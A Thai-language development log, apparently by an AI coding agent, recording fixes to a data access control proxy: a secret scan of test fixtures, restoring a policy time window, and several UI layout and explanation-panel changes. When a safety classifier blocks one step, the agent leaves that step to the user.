3. *"อยากให้มี Expand, Collapse all"* — หน้า Governance เพิ่มปุ่ม Expand all / Collapse all ข้างช่อง filter · implement เป็น **คำสั่งครั้งเดียว (`{nonce, open}`) ไม่ใช่โหมด** — ถ้าเก็บเป็น boolean mode แล้ว "expand all" จะคอยง้างแถวที่ผู้อ่านเพิ่งปิดให้เปิดใหม่ตลอด

### I. คำถามที่ตอบไประหว่างรอบนี้ (เก็บไว้เพราะจะถูกถามอีก)

- **"เปลี่ยน database type แล้ว logic proxy ต้องเปลี่ยนไหม"** — ไม่ต้อง `QueryRewriter` + `PolicyEngine` ใช้ร่วมกันหมด ที่เปลี่ยนอยู่หลัง `SqlDialect` 4 method (`quote` / `literal` / `toText` / `mask`) · `QueryService.dialectFor(source)` เลือกจาก `source.engine()` · row limit ใช้ JDBC `setMaxRows` ไม่ได้เขียน `LIMIT`/`TOP` ลง SQL · **ความเสี่ยงจริงอยู่ที่ parser** — JSqlParser เข้าใจ ANSI เป็นหลัก T-SQL เฉพาะทาง (`OUTER APPLY`, query hint) อาจ parse ไม่ผ่านแล้วถูก reject ทิ้ง (ปลอดภัยแต่ผู้ใช้จะงง) ต้องทดสอบจริงตอนต่อ MSSQL · source ที่ไม่ใช่ SQL ต้องเขียน compiler คนละตัวที่กิน `PolicyDecision` เดียวกัน
- **"ต้องมี list ของ type ที่รองรับใช่ไหม"** — ใช่ มีแล้ว 3 ชั้น: (1) `DataSourceStore.Engine` + `Engine` ใน `enforcement.ts` = `POSTGRES | SQLSERVER` (2) capability matrix ต่อโหมด ใน `enforcement.ts` คำนวณสดตอนพิมพ์ policy (3) masking function ที่แต่ละ dialect สะกดได้ — **`REGEX_REPLACE` บน SQL Server โยน `UnsupportedMaskingException` ทิ้ง ไม่ degrade** · **ช่องว่าง:** ชั้น (3) ยังไม่ถูกดึงขึ้นมาใน matrix ของ UI และ matrix ยังไม่รู้จัก *เวอร์ชัน* (MSSQL 2019/2022/2025, PG มี extension `anon` ไหม)
- **"Access เป็น local policy ใช่ไหม"** — ไม่ใช่ เมนู Access คือ **Grant** (FR-7) ให้สิทธิ์ตรงๆ พร้อมวันหมดอายุ คนละเรื่องกับ policy ที่เขียนเป็นเงื่อนไข
- **"มีเก็บ log การรัน การ configure ไว้ไหม"** — query กับ decision กับ policy change มีครบ · **การ configure ไม่มีเลย** (เปลี่ยน data source / OM settings ไม่ถูกบันทึกที่ไหน) ดู Next Steps

### J. 🔴 Secret scan ก่อน commit — เจอของจริงสองรายการ

repo เป็น **public** ทุก commit อ่านได้ทั้งโลก ก่อน commit รอบนี้จึง scan สองชั้น:
ชั้นแรกเทียบกับ **ค่าจริงใน `.env`** (`IDENTITY_BOOTSTRAP_ADMIN_PASSWORD`, `OM_WEBHOOK_SECRET`, `FERNET_KEY`, `OM_JWT_TOKEN`, `SRC_PG_ARAK_CREDENTIAL`, `DAC_DB_PASSWORD`) → ผ่าน
ชั้นสองเป็น **pattern ทั่วไป** (password ที่พบบ่อย, JWT, private key, IP ภายใน) → **เจอสองรายการ และทั้งคู่เป็นของจริง**

| ไฟล์ | ของที่หลุด | แก้เป็น |
|---|---|---|
| `dac-service/.../policy/QueryServiceInetTest.java:23` | **IP ภายในของ OpenMetadata instance ของทีม** (`10.6.x.x` — ไม่เขียนเต็มซ้ำที่นี่) ถูกใช้เป็น fixture ของ IPv4 | `192.0.2.10` (TEST-NET-1, RFC 5737) + คอมเมนต์บอกเหตุผล |
| `dac-service/.../source/DataSourceStoreIT.java:95` | **รหัสผ่าน OpenMetadata จริงที่ผู้ใช้เคยพิมพ์ในแชท** ถูกใช้เป็น fixture ของ "รหัสผ่านที่ต้องถูกปฏิเสธ" | `not-a-real-secret` / `sa/not-a-real-secret` |

**บทเรียน:** fixture ทั้งสองตัว *ทำงานถูกต้อง* ทุกประการ — test เขียวมาตลอด สิ่งที่ผิดคือ**ค่าที่หยิบมาใช้** คนเขียน test มักหยิบค่าที่อยู่ตรงหน้า (IP ที่เพิ่ง curl, รหัสผ่านที่เพิ่งอ่าน) โดยไม่คิดว่ามันจะถูก push ขึ้น public repo
ข้อที่เจ็บกว่าคือ `DataSourceStoreIT` เป็น test ที่ตั้งใจพิสูจน์ว่า **`credential_ref` ต้องไม่รับรหัสผ่านดิบ** — แล้วดันเอารหัสผ่านจริงมาเป็นตัวอย่าง

⚠️ **รอบถัดมาเกิดซ้ำในที่เดิม** — หัวข้อ J ฉบับแรก **เขียน IP กับรหัสผ่านตัวจริงลงในตาราง** เพื่ออธิบายว่าลบอะไรออก — คือเอาค่าที่เพิ่งลบกลับมา commit ใหม่ในเอกสารที่ห้ามทำสิ่งนั้น secret scan รอบถัดไปจับได้และ redact แล้ว
> **ข้อสรุป:** เวลาบันทึกว่า “ลบค่า X ออก” **ห้ามเขียน X ลงไป** — ให้บรรยายว่ามันคืออะไร อย่าเขียนว่ามันคืออะไร

> **กติกาถาวร:** ค่าใน fixture ต้องเป็นค่าที่ **ใช้กับอะไรไม่ได้เลย** — IP ใช้ `192.0.2.x` / `198.51.100.x` / `203.0.113.x` (RFC 5737), host ใช้ `example.com`, secret ใช้สตริงที่อ่านแล้วรู้ทันทีว่าปลอม ห้ามหยิบค่าจาก environment จริงมาวาง

### K. คืนค่า time window ของ `finance-subscription` (ปิดช่องว่างข้อ 8)

ระหว่างรอบพิสูจน์ 5.2 มีการแก้ window เป็น `["MON-FRI","SAT","SUN"]` เพื่อไม่ให้ test ที่รันวันเสาร์ถูกปฏิเสธด้วยเหตุผลผิดเรื่อง — แต่ปล่อยไว้แปลว่า demo **ไม่ได้ demo time predicate อีกต่อไป**
คืนกลับเป็น `["MON-FRI"]` แล้ว (policy `b594579f-a825-42bc-9dac-64de9b279d03` → **version 4**) ผ่าน `PUT /api/v1/policies/{id}?version=&reason=`

> ⚠️ **API shape ที่หลงทางง่าย** — `PUT /policies/{id}` รับ **`Policy` document ตรงๆ เป็น body** ส่วน `version` กับ `reason` เป็น **query parameter** ไม่ใช่ `{document, expectedVersion, reason}` ใน body (ลองแบบหลังแล้วได้ 400)

ยืนยันผลสด (วันที่รัน = เสาร์ 2026-09-20):

```
POST /api/v1/query {"sourceId":"…","sql":"select * from sales.customer","asPrincipal":"analyst_a"}
→ 403 "Access to demo-pg.salesdb.sales.customer is denied.
        finance-subscription did not apply: outside the policy's permitted time window"
```

เท่ากับพิสูจน์ **E2E ข้อ 15** (นอกเวลาทำการต้อง deny) และ **FR-5.4 explainability** (บอกชื่อ policy + เหตุผลที่ไม่ผ่าน) ไปพร้อมกัน
**ผลข้างเคียงที่ต้องรู้:** ถ้าเปิดหน้า Query ในวันเสาร์-อาทิตย์ หรือนอก 08:00–18:00 Asia/Bangkok จะถูกปฏิเสธ — **นั่นคือพฤติกรรมที่ถูกต้อง ไม่ใช่บั๊ก**

> ⚠️ **`QueryResource.Ask` ใช้ชื่อ field `sourceId` ไม่ใช่ `dataSourceId`** — ส่งผิดชื่อได้ 400 `"Say which source to run against"` ซึ่งอ่านแล้วเหมือน id หายไป ทั้งที่ส่งไปแล้ว

### L. Catalog — เปลี่ยนแถวชิป facet เป็น filter rail แบบ OpenMetadata Explore

เดิม facet filter เป็น**แถวชิปที่ wrap ไปเรื่อยๆ** (Tags / Domains / Classifications / Tier) — ผู้ใช้บอกว่า "ไม่สวย ทำให้เหมือน openmetadata สิ"
ปัญหาจริงไม่ใช่แค่ความสวย แต่คือ **ชิปเป็นรูปทรงที่ผิดสำหรับข้อมูลที่เป็นลำดับชั้น**: sub-domain สามตัวใต้ `Premium Service Delivery` ขึ้นต้นด้วยอักษรชุดเดียวกัน 24 ตัว พอถูก CSS ตัดให้พอดีชิป มันเหลือเป็นข้อความ**เหมือนกันเป๊ะทั้งสามอัน** — filter ที่แยกตัวเลือกไม่ออกแย่กว่าไม่มี filter

แทนที่ `FacetPicker` ด้วย `FacetRail` + `FacetGroup` ใน [CatalogPage.tsx](frontend/app/src/pages/catalog/CatalogPage.tsx):

| ของเดิม | ของใหม่ |
|---|---|
| ชิป wrap แนวนอนเหนือผลลัพธ์ | rail ซ้าย `w-64` sticky · หนึ่งค่า = หนึ่งบรรทัด |
| `shortFqn()` (ตัดหัว เหลือ `… / tail`) | `leaf()` + **indent ตามความลึกของ FQN** (12px/ชั้น, cap 3 ชั้น) + `title` เป็น FQN เต็ม |
| เรียงตามจำนวน asset | **เรียงตาม FQN** เพื่อให้ parent อยู่บรรทัดเหนือลูกเสมอ — ไม่งั้น indent จะโกหกว่าใครอยู่ใต้ใคร |
| ไม่มี | กลุ่มพับได้ · badge นับ filter ที่เลือก · search ในกลุ่มเมื่อมี ≥10 ค่า · `Show all N` เมื่อเกิน 6 ค่า |
| ไม่มี | ค่าที่**ติ๊กไว้แล้วถูกวาดเสมอ** แม้หลุดจาก preview หรือ search — filter ที่มองไม่เห็นคือ filter ที่ปลดไม่ได้ |

ตรวจแล้ว: `tsc --noEmit` ผ่าน · `npx jest` **7 suites / 25 tests เขียวหมด** · screenshot ผ่าน Playwright (Edge) ยืนยันหน้าตา

**กับดักสี่อันที่เจอระหว่างทาง — จดไว้ให้ไม่ต้องเสียเวลาซ้ำ:**

1. **Tailwind 4 prefix ต้องมาก่อน breakpoint** — `tw:lg:block` ✅ / `lg:tw:block` ❌ (เขียนผิดแล้ว class เงียบหาย Playwright ฟ้อง "locator resolved to hidden")
2. **JSX comment `{/* */}` วางระหว่าง `return (` กับ element ไม่ได้** — กลายเป็นสอง expression → Babel ฟ้อง `Unexpected token, expected ","` ต้องใช้ `//` เหนือ `return (` แทน
3. **test runner ของโปรเจกต์นี้คือ Jest ไม่ใช่ vitest** — `npx vitest run` จะไปกวาด `e2e/smoke.spec.ts` แล้วพังทั้ง 8 suites ใช้ `npx jest`
4. **`Checkbox` ที่ vendor มาจาก OM render `<label>` ของตัวเองอยู่แล้ว** — เอาไปซ้อนใน `<label>` อีกชั้น input จะ**ไม่มี accessible name เลย** ต้องใช้ `<div>` + `aria-label` ชัดๆ (ใส่เป็น FQN เต็ม เพราะ "Sensitive" เฉยๆ ไม่บอกว่าเป็นของ classification ไหน) แล้วให้ข้อความที่มองเห็นเป็น `<button tabIndex={-1}>`

> icon `Collapse01` **ไม่มี** ใน `@untitledui/icons` — ที่มีคือ `ChevronDown`, `ChevronRight`, `FilterLines`, `Minimize01`, `Maximize01`, `Expand01`

### M. 🔴 คำแนะนำ "ลองใน UI ยังไงให้เห็น RLS + Mask" ที่เคยให้ไว้ — **ผิด** แก้แล้ว

ผู้ใช้ลองทำตามแล้วได้ `Refused` ทันที สาเหตุมีสองข้อ **และเป็นความผิดของคำแนะนำทั้งคู่**

**ข้อ 1 — ตารางเดิมบอกว่า "ไม่เลือก Run as → query ในฐานะ `admin` → ไม่โดนอะไรเลย" ซึ่งกลับหัวกลับหางกับความจริง**
`admin` **ไม่ได้อยู่ใน subject ของ `finance-subscription`** เลย → โดน **default-deny** ตาม FR-3.3 ไม่ใช่ "เห็นครบทุกแถว"
พิสูจน์สด:

```
run as (nobody -> admin)
→ "finance-subscription did not apply:
   principal is none of the roles, teams, groups or users the policy names"
```

> นี่เป็นพฤติกรรมที่**ถูกต้อง** — platform admin คุม *ระบบ* ไม่ได้แปลว่าเห็น *ข้อมูล* (separation of duty ตาม FR-2.6) แต่คำแนะนำเดิมเขียนตรงข้าม

**ข้อ 2 — วันที่ลองคือเสาร์ ส่วน window เพิ่งถูกคืนเป็น `MON-FRI` ในรอบเดียวกัน (ดูหัวข้อ K)** → ต่อให้เลือก `analyst_a` ถูกก็ยังโดนปฏิเสธอยู่ดี ด้วยเหตุผลคนละอัน

ผลจริงทั้งสี่เคส วันเสาร์ 2026-09-20:

| Run as | ผลลัพธ์ |
|---|---|
| `admin` (ค่า default) | ❌ `principal is none of the roles, teams, groups or users the policy names` |
| `analyst_a` | ❌ `outside the policy's permitted time window` |
| `steward_c` | ❌ `outside the policy's permitted time window` |
| `analyst_b` | ❌ `expression is false for this principal: user.country == asset.prop('dataResidency')` ← **อันนี้ถูกต้องตามดีไซน์** |

**ตารางที่ถูกต้อง** (ใช้ได้เมื่อ window เปิดอยู่ — ดูสวิตช์ด้านล่าง):

| Run as | attribute | เห็นอะไร | โดนอะไร |
|---|---|---|---|
| `analyst_a` | clearance=L1 · country=TH · branch=BKK-01 | 2 แถว · `email` = `***@example.co.th` · `citizen_id` = `*****3456` | **โดนทั้ง RLS และ Mask ← อันนี้คืออันที่ต้องลอง** |
| `steward_c` | clearance=L2 · country=TH · branch=BKK-01 + CNX-01 | 2 แถว · email/citizen_id เห็นเต็ม | โดน RLS อย่างเดียว — L2 ผ่าน mask |
| `analyst_b` | country=SG | ไม่เห็นอะไรเลย | โดน Subscription policy ตัด |
| `admin` / ไม่เลือก | – | **ไม่เห็นอะไรเลย** | **โดน default-deny — ไม่ใช่ "เห็นหมด"** |

#### สวิตช์ time window — [scripts/demo-time-window.py](scripts/demo-time-window.py)

ปัญหาเชิงออกแบบที่โผล่มาจากเรื่องนี้: **ไม่มีค่า default ของ window ที่ถูกทั้งสองทาง**
ตั้งเป็นเวลาทำการ → demo ปฏิเสธทุกเย็นและทุกเสาร์อาทิตย์ ซึ่งเป็นเวลาที่คนมานั่งดูจริงๆ และสิ่งที่เห็นคือ refusal ที่ไม่ได้พูดถึง RLS หรือ mask เลย
ตั้งเป็นเปิดตลอด → ไม่เคยได้ demo time predicate

จึงทำเป็น**สวิตช์** แทนที่จะเถียงกันว่า default ควรเป็นอะไร:

```bash
python scripts/demo-time-window.py open     # ทุกวัน ทุกเวลา — ใช้ตอน demo RLS/mask
python scripts/demo-time-window.py office   # MON-FRI 08:00-18:00 — ใช้ตอน demo time predicate
```

> ⚠️ **สถานะตอนนี้ = `office`** (จากหัวข้อ K) — แปลว่า **หน้า Query จะปฏิเสธจนถึงวันจันทร์ 08:00 Asia/Bangkok**
> สคริปต์ถูกเขียนแล้วแต่ **ยังไม่ได้รัน** เพราะ auto-mode classifier บล็อกด้วยเหตุผล `Security Weaken` (การขยาย time window ของ access policy อ่านแล้วเหมือนการลดความปลอดภัย ซึ่งเป็นการบล็อกที่สมเหตุสมผล) — **ผู้ใช้ต้องรันเองหนึ่งครั้ง**

### N. ตรวจหน้า Query ด้วยตาเป็นครั้งแรก (ปิดช่องว่างข้อ 7) — เจอ bug ใน `Select` ที่ vendor มา

หน้า `/query` **ไม่เคยถูกเปิดดูจริงเลย** ตั้งแต่สร้างมา — screenshot ผ่าน Playwright (Edge) แล้วเจอของจริงสองอย่าง

**1. Select ของ source แสดงชื่อเหลือตัวเดียว** — `demo-pg  POSTGRES · localhost:5433` ถูก render ออกมาเป็น `c POSTGRES · localhost:5433`
ต้นเหตุอยู่ใน [ui-core-components/.../select.tsx](frontend/ui-core-components/src/components/base/select/select.tsx) — ใน trigger นั้น `label` มี `tw:truncate` (หดได้) แต่ `supportingText` **ไม่มีทั้ง `truncate` และ `min-w-0`** → ใน flex row ตัวที่หดไม่ได้จะยืนยันความกว้างเต็ม แล้วโยนการหดทั้งหมดไปให้ label
นั่นแปลว่า **ข้อความรอง ชนะ ข้อความหลัก** — ส่วนที่บอกว่าผู้ใช้เลือกอะไรอยู่คือส่วนที่หาย กระทบ**ทุก Select ในแอป** ไม่ใช่แค่หน้านี้
แก้โดยให้ `supportingText` เป็น `tw:min-w-0 tw:shrink-[9999] tw:truncate` → มันยอมหดก่อนเสมอ ชื่อ source จึงอยู่ครบ

**2. ตัวเลือก Run as ชื่อ `As myself` ทำให้เข้าใจผิด** — แก้เป็น `As myself (policies apply)` และให้ banner อธิบายทั้งสองกรณี (เดิมขึ้นเฉพาะตอนเลือกคน) — การเงียบตอนไม่ได้เลือกคือสิ่งที่ทำให้คนอ่าน refusal แล้วคิดว่าระบบพัง

### O. หน้า Query บอกได้แล้วว่า "โดน policy อะไรไปบ้าง" ไม่ใช่แค่ส่ง SQL ที่ rewrite แล้วมาให้อ่านเอง (FR-5.4)

**ที่มา:** ผู้ใช้ขอ "ให้ผมลอง RLS, masking ให้เห็นภาพใน UI"
ปัญหาคือก่อนหน้านี้ผลลัพธ์**ไม่ได้บอกอะไรเลย**ว่าเกิดอะไรขึ้น:

- แถวที่ถูก RLS ตัดออก → **หายไปเฉยๆ** ไม่มีอะไรบอกว่าหายเพราะอะไร
- column ที่ถูก mask → ขึ้นเป็น `***@example.co.th` ซึ่ง**อ่านแล้วเหมือนข้อมูลจริงที่หน้าตาแปลก** มากกว่าเหมือนถูก mask
- คนที่จะรู้ความจริงได้ต้องไปเปิดแท็บ `Statement that ran` แล้วอ่าน SQL ที่ generate มา ซึ่งเป็นการขอมากเกินไปจากคนที่แค่อยากดูว่า policy ทำงานไหม

> นี่คือช่องว่าง FR-5.4 ในหน้าจอนี้ — "decision ที่อธิบายไม่ได้ คือ decision ที่ไม่มีใครกล้า enforce"

#### สิ่งที่ทำ — ลาก `PolicyDecision` ออกมาจนถึงหน้าจอ

เดิม `QueryRewriter` เก็บ `Map<String, Governed>` (มี `PolicyDecision` เต็มๆ อยู่ในมือ) แล้ว **โยนทิ้ง** เหลือแต่ชื่อ asset

| ชั้น | เปลี่ยนอะไร |
|---|---|
| [QueryRewriter.java](backend/dac-proxy/src/main/java/com/mfec/dac/proxy/QueryRewriter.java) | `Rewritten` เพิ่ม field `List<Governed> governed` — เก็บ decision ไว้แทนที่จะทิ้ง (ยังคง `assets` ไว้เหมือนเดิม ไม่ทำให้ของเดิมพัง) |
| [QueryService.java](backend/dac-service/src/main/java/com/mfec/dac/policy/QueryService.java) | เพิ่ม record `Explanation(asset, maskedColumns, hiddenColumns, rowFilters, policies)` + เมธอด `explain()` ที่แปลง decision เป็นภาษาคน |
| [QueryResource.java](backend/dac-service/src/main/java/com/mfec/dac/resources/QueryResource.java) | ใส่ `explanations` ลงใน response body |
| [api/query.ts](frontend/app/src/api/query.ts) | type `Explanation` |
| [QueryPage.tsx](frontend/app/src/pages/query/QueryPage.tsx) | `AppliedPolicies` แถบเหนือตาราง + badge `masked` บนหัว column |

**สิ่งที่เห็นบนจอตอนนี้** (แถบเหนือตารางผลลัพธ์):

```
🛡 demo-pg.salesdb.sales.customer   [sales-branch-rls (SCHEMA)] [pii-masking-below-l2 (ORG)]
   ▽ Rows kept where branch_code is one of BKK-01
   ◎ citizen_id  hidden except the last 4 characters
   ◎ email       rewritten by pattern ^[^@]+
```

และบนหัว column ของ `email` / `citizen_id` มีป้าย `masked` (hover เห็นรายละเอียด)

#### การตัดสินใจเชิงออกแบบสามข้อ

1. **สร้างคำอธิบายจาก `PolicyDecision` ไม่ใช่จาก SQL** — SQL เป็นแค่ *หนึ่งใน* สาม rendering ของ decision เดียวกัน (FR-6.0c) ถ้าไปอ่านจาก SQL คำอธิบายจะจริงเฉพาะโหมด proxy แล้วต้องเขียนใหม่อีกสองรอบตอนทำ 5.1.1 / 5.1.2
2. **วางไว้เหนือตาราง ไม่ใช่ในแท็บ Job details** — คนที่เปิดหน้านี้กำลังเทียบ principal สองคนอยู่ สายตาอยู่ที่แถว ไม่ได้อยู่ที่แท็บอื่น
3. **ติดป้ายที่หัว column ด้วย ไม่ใช่แค่ในแถบ** — column ที่ mask แล้วค่ายัง**ดูสมเหตุสมผล**คือ column ที่มีโอกาสถูกอ่านว่าเป็นของจริงมากที่สุด

#### เคสที่จงใจเขียนไว้ — `IN_LIST` ที่ values ว่าง

```
branch_code must match one of the principal's values, and they have none
```

ตารางว่างเพราะ principal ไม่มี attribute ที่ filter นั้นใช้เทียบ = **คำตอบที่ถูก ไม่ใช่หน้าจอพัง** ก่อนหน้านี้สองอย่างนี้หน้าตาเหมือนกันเป๊ะ

#### Test — [QueryExplanationTest.java](backend/dac-service/src/test/java/com/mfec/dac/policy/QueryExplanationTest.java) (6 tests)

เขียน test ให้ทุกประโยคที่จะขึ้นจอ เพราะ**คำอธิบายที่เลิกตรงกับ enforcement ที่มันอธิบาย แย่กว่าไม่มีคำอธิบาย — เพราะคนเชื่อมัน**

#### 🐛 บั๊กที่เจอระหว่างทาง — `scripts/demo-time-window.py` เขียน key ผิด

```python
'tz': 'Asia/Bangkok'        # ❌ ผิด — schema ใช้ `timezone`
'timezone': 'Asia/Bangkok'  # ✅ แก้แล้ว
```

key ที่ไม่รู้จัก**ไม่ error** แต่ถูกทิ้งเงียบๆ → window จะเสีย timezone ไปแล้ว fallback ไปใช้นาฬิกาของ server ซึ่งเป็นบั๊กที่ FR-3.2 พูดถึงตรงๆ ("timezone เป็นส่วนหนึ่งของกฎ ไม่ใช่เอามาจากที่ engine บังเอิญรันอยู่") **สคริปต์ยังไม่เคยรันสำเร็จ จึงยังไม่เคยสร้างความเสียหาย**

#### 🔴 ยังค้าง — ผู้ใช้ต้องเปิด time window เอง

ผู้ใช้สั่ง "แก้ให้หน่อย" ผมพยายามรัน `demo-time-window.py open` **สองครั้ง ถูก classifier บล็อกทั้งสองครั้ง** ด้วยเหตุผล `[Security Weaken]` ไม่ได้พยายามเลี่ยง

**ทางที่สั้นที่สุดสำหรับผู้ใช้ — ไม่ต้องใช้สคริปต์เลย:**
`/policies/b594579f-a825-42bc-9dac-64de9b279d03` → Time windows → dropdown วัน `weekdays` → **`every day`** → Save
ไม่ต้องแตะช่วงเวลา เพราะ [TimeMatcher.java:95-100](backend/dac-engine/src/main/java/com/mfec/dac/engine/TimeMatcher.java#L95-L100) ตีความ day list ว่างว่า "ทุกวัน" อยู่แล้ว และได้ทดสอบหน้า Policy Builder + versioning ไปในตัว

### O2. 🐛 Time window แสดงผิดไป 12 ชั่วโมง — `18:00` ขึ้นจอว่า `06:00`

**เจอตอน:** ผู้ใช้ถามว่า "ทำไมมันยังขึ้น Refused" แล้วผมเปิดหน้า policy ด้วย Playwright ไปดู

ช่อง from/to ใน [SubjectBuilder.tsx](frontend/app/src/pages/policies/SubjectBuilder.tsx) เป็น `<input type="time">` กว้าง `tw:w-24` (96px)
บน Edge locale en-US เบราว์เซอร์เรนเดอร์เป็น **12 ชั่วโมง** คือ `06:00 PM` + ไอคอนนาฬิกา ซึ่ง**ไม่พอ** → ส่วน `PM` ถูกตัดทิ้ง เหลือบนจอว่า `06:00`

| | ค่าจริงใน DB | ที่ขึ้นบนจอ |
|---|---|---|
| `to` | `18:00` | **`06:00`** |

> ข้อมูลไม่ได้เสีย (`input.value` ยังเป็น `"18:00"`) แต่**คนอ่านผิดไป 12 ชั่วโมง** บนหน้าจอเดียวที่มีหน้าที่บอกว่า "สิทธิ์นี้ใช้ได้ถึงกี่โมง" — ในแอป access control อันนี้คือบั๊กที่ยอมไม่ได้

**แก้:** `tw:w-24` → `tw:w-36` ทั้งสองช่อง
**พิสูจน์:** วัดจาก DOM — เดิม `scrollWidth > clientWidth` (ล้น) ตอนนี้ `clientWidth === scrollWidth === 142` ทั้งคู่ → `clipped: false`

### O3. ยืนยันแล้วว่าปุ่ม Save ของ Policy Builder **ไม่ได้พัง**

ผู้ใช้รายงานว่าแก้ time window แล้วยัง Refused อยู่ → ไล่ดูพบว่า `updatedAt` ฝั่ง server ยังเป็น `2026-09-20T04:04:14Z` (11:04 น.) **แปลว่าไม่มี save เข้ามาเลย**

ทดสอบ client path ด้วย Playwright โดย **route intercept + abort** (ดูว่าจะส่งอะไร โดยไม่ให้ถึง server จริง):

```
>>> PUT /api/v1/policies/b594579f-…?version=4
>>> subject.time = {"windows":[{"from":"08:00","to":"18:00","timezone":"Asia/Bangkok"}]}
```

- dropdown มีครบ 3 ตัวเลือก: `every day` / `weekdays` / `weekends`
- เลือก `every day` แล้ว `days` **หายออกจาก payload** ถูกต้องตาม [TimeMatcher.java:95-100](backend/dac-engine/src/main/java/com/mfec/dac/engine/TimeMatcher.java#L95-L100) (list ว่าง = ทุกวัน)
- ปุ่ม Save ไม่ disabled, ไม่มี error บนจอ, ยิง request 1 ครั้ง

→ **สรุป: ทั้ง form, serialization และ mutation ทำงานถูกหมด** ที่ยังไม่เปลี่ยนคือ save ไม่เคยถูกกดจนสำเร็จ วิธีเช็กว่าสำเร็จ: ป้าย version บนหัวหน้าต้องเปลี่ยนจาก **v4** เป็น **v5**

> ~~หมายเหตุสำหรับรอบหน้า: console มี warning `Maximum update depth exceeded ... at Navigate (react-router-dom)` บนหน้านี้ — ยังไม่ได้ไล่ ยังไม่เห็นว่ากระทบการทำงาน แต่เป็น render loop ที่ควรตามต่อ~~ → **ปิดแล้วใน O8** และ "ยังไม่เห็นว่ากระทบการทำงาน" คือการอ่านที่ผิด มันคือต้นเหตุของหน้าขาวตอน login

### O4. 🐛 แถบ explanation ไปเบียดตารางจนแถวหาย — แก้ด้วย splitter ลากได้

**ที่มา:** ผู้ใช้เปิด time window สำเร็จแล้ว (policy เป็น v5) query ได้ แถบ explanation ขึ้นครบ **แต่ไม่เห็นแถวเลย**

ตรวจ API ก่อน — backend ถูกต้อง 100%:
```
rows : [[1,"Somchai Wong","***@example.co.th","*********3456",…,"BKK-01"],
        [2,"Nattaporn Sri","***@example.co.th","*********4567",…,"BKK-01"]]
```
RLS + masking ทำงานครบ → **ปัญหาอยู่ที่ layout ที่ผมเพิ่งแก้ในรอบ O**

วัดจาก DOM บน viewport 1600×1000:

| | สูง |
|---|---|
| ช่องผลลัพธ์ทั้งหมด | 163px |
| แถบ explanation ที่ผมเพิ่งแทรก | ~85px |
| **เหลือให้ตาราง** | **~78px** |

> ผมเพิ่ม block เข้าไปใน pane ที่มีความสูง**ตายตัว** โดยไม่ได้เพิ่มพื้นที่ให้ — บนจอผมเห็น 2 แถวแบบเฉียดฉิว จอเตี้ยกว่านั้นนิดเดียวแถวหายหมด **เป็นบั๊กที่ผมทำเอง**

#### ทางแก้ที่ **ไม่** เลือก และเหตุผล

ตอนแรกแก้เป็น `flex-[1.1]` → `flex-[2]` (ให้ผลลัพธ์กินพื้นที่มากขึ้น) แต่ผู้ใช้ท้วงว่า **"ต้องทำให้เห็นครบสิ ในอนาคตอาจจะมี Row เยอะ"** — ถูกต้อง สัดส่วนตายตัวตอบโจทย์ไม่ได้ เพราะ SQL บรรทัดเดียว + 1000 แถว กับ SQL 40 บรรทัด + 3 แถว ต้องการสัดส่วน**ตรงข้ามกัน** และทั้งคู่เป็นเคสปกติ

#### ทางแก้ที่เลือก — `Splitter` ลากได้ (แบบ BigQuery)

[QueryPage.tsx](frontend/app/src/pages/query/QueryPage.tsx) — component `Splitter`

- ลากเส้นคั่นระหว่าง editor กับผลลัพธ์ได้ตามใจ
- **จำค่าไว้ใน `localStorage`** (`arak.query.editorHeight`) — ห่อ try/catch ทั้ง read และ write เพราะ private window โยน exception และ preference ที่พังต้องไม่ทำให้หน้าพัง
- clamp: editor ต่ำสุด 72px, ผลลัพธ์**การันตีขั้นต่ำ 140px เสมอ** วัดจาก `clientHeight` ของ column จริง ไม่ใช่ค่าคงที่
- **ใช้คีย์บอร์ดได้ด้วย** — `role="separator"` + `tabIndex=0` + `ArrowUp/Down` (Shift = ก้าวใหญ่) เส้นคั่นที่ตอบสนองแค่เมาส์คือการยึดตารางไปจากคนที่ใช้เมาส์ไม่ได้
- แถบ explanation ได้ `max-h-32 overflow-auto` — asset ที่มี masked column สิบกว่าตัวต้องไม่สามารถดันแถวที่มันกำลังอธิบายหลุดจอได้ **คำอธิบายมีไว้ทำให้ตารางอ่านง่ายขึ้น จึงไม่มีทางสำคัญกว่าตาราง**

**พิสูจน์ด้วย Playwright:** ลากขึ้น 130px → พื้นที่ตาราง `234px → 362px`, `localStorage` เก็บ `72` (ชน min พอดี = clamp ทำงาน) · `tsc` ผ่าน · `jest` 7 suites / 25 tests ผ่าน

### O5. ทำไม "Run แล้วไม่เห็น Row" — สาเหตุจริง บวกโหมดเต็มจอแบบ BigQuery

**คำอธิบายสองรอบก่อนของผมผิดทั้งคู่** — ไม่ใช่ "แถบอธิบายแย่งที่กับ grid" (แก้ด้วย ratio) และไม่ใช่ "ลาก splitter เอา" — **แถวถูก render ออกมาถูกต้องตลอด แต่มันอยู่นอกจอ และหน้า scroll ลงไปดูไม่ได้**

#### หลักฐาน — วัดด้วย Playwright 4 ขนาดจอ (ก่อนแก้)

| จอ | แถวแรกสิ้นสุดที่ | จอสูง | หลุดจอ? | scroll ได้? |
|---|---|---|---|---|
| 1920×1080 | 805 | 1080 | ✅ | — |
| 1536×864 | 823 | 864 | ✅ | — |
| **1366×768** | **841** | 768 | ❌ | **ไม่ได้** |
| **1280×720** | **862** | 720 | ❌ | **ไม่ได้** |

`document.scrollHeight === document.clientHeight` ทุกขนาด → แถวถูก render จริง (`rows: 2` ทุกขนาด) แต่**เข้าถึงไม่ได้เลย**

#### สาเหตุจริงมี 4 ชั้นซ้อนกัน ไม่ใช่ชั้นเดียว

1. **`tw:h-[calc(100vh-8rem)]` ที่ root ของหน้า** — กัน chrome ไว้ 8rem (128px) แต่ header + ชื่อหน้า + คำอธิบายกินจริง ~230px และ**คำอธิบาย wrap เพิ่มบรรทัดเมื่อจอแคบลง** → จอยิ่งเล็ก เนื้อหายิ่งล้นล่าง
   → แก้ด้วย `useFillViewport()` — **วัด `getBoundingClientRect().top` จริง แล้วเอา `window.innerHeight` ลบ** (`innerHeight` ไม่ใช่ `100vh` — บนมือถือสองค่านี้ต่างกัน) + `ResizeObserver`
2. **console column ไม่มี `tw:min-h-0`** — flex child ที่ขาด `min-h-0` **หดตัวต่ำกว่า content ไม่ได้** → root สูงตามที่วัดมา แต่ของข้างในทะลุออกมา
3. **แถบอธิบาย policy เป็น `tw:max-h-32` + `tw:shrink-0`** — นี่คือตัวร้ายตัวจริง: panel สูง 140px แต่ tab bar 36 + strip 128 = 164 → **กล่องตารางเหลือสูง `0px` และถูกดันไปวางใต้ panel ที่ top=735 ขณะที่ panel จบที่ 728**
